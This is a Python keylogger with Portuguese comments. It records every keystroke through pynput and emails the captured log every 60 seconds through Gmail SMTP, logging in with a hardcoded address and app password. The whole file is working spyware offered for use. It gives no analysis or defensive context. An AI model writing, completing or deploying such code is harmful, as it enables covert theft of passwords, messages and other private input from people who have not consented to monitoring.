
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer
import sys

EMAIL_ORIGEM = "seuemail@gmail.com"
EMAIL_DESTINO = "seuemail@gmail.com"
SENHA_EMAIL = "waaq taei lhai inqj" 
log = ""

INTERVALO_ENVIO = 60

IGNORAR = {
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l, keyboard.Key.alt_r,
    keyboard.Key.caps_lock, keyboard.Key.backspace,
    keyboard.Key.cmd_l, keyboard.Key.cmd_r,
    keyboard.Key.menu
}

def enviar_email():
    """Envia o conteúdo do log por e-mail e reinicia o Timer."""
    
    global log
    
    Timer(INTERVALO_ENVIO, enviar_email).start()

    if not log:
        
        return 

    msg = MIMEText(log, 'plain', 'utf-8')
    msg['Subject'] = "Dados capturados pelo Keylogger"
    msg['From'] = EMAIL_ORIGEM
    msg['To'] = EMAIL_DESTINO

    try:
        
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
        
        # Envia a mensagem
        server.send_message(msg)
        server.quit()
        
        print(f"\n[INFO] Log enviado com sucesso. Tamanho: {len(log)} caracteres.")
        
        
        log = ""
        
    except Exception as e:
        print(f"\n[ERRO] Falha ao enviar o e-mail: {e}", file=sys.stderr)



def on_press(key):
    """Manipula o pressionamento de teclas e adiciona ao log."""
    
    global log
    
   
    if key in IGNORAR:
        return

    try:
       
        log += key.char
        
    except AttributeError:
        
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n" 
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.esc:
            log += " [ESC] "
        else:

            log += f"[{str(key).replace('Key.', '').upper()}]"
            
    except Exception as e:
        print(f"Erro no registro de tecla: {e}", file=sys.stderr)



if __name__ == "__main__":
    print(f"Keylogger iniciado. Enviando logs a cada {INTERVALO_ENVIO} segundos para {EMAIL_DESTINO}")
    

    Timer(INTERVALO_ENVIO, enviar_email).start()
    

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
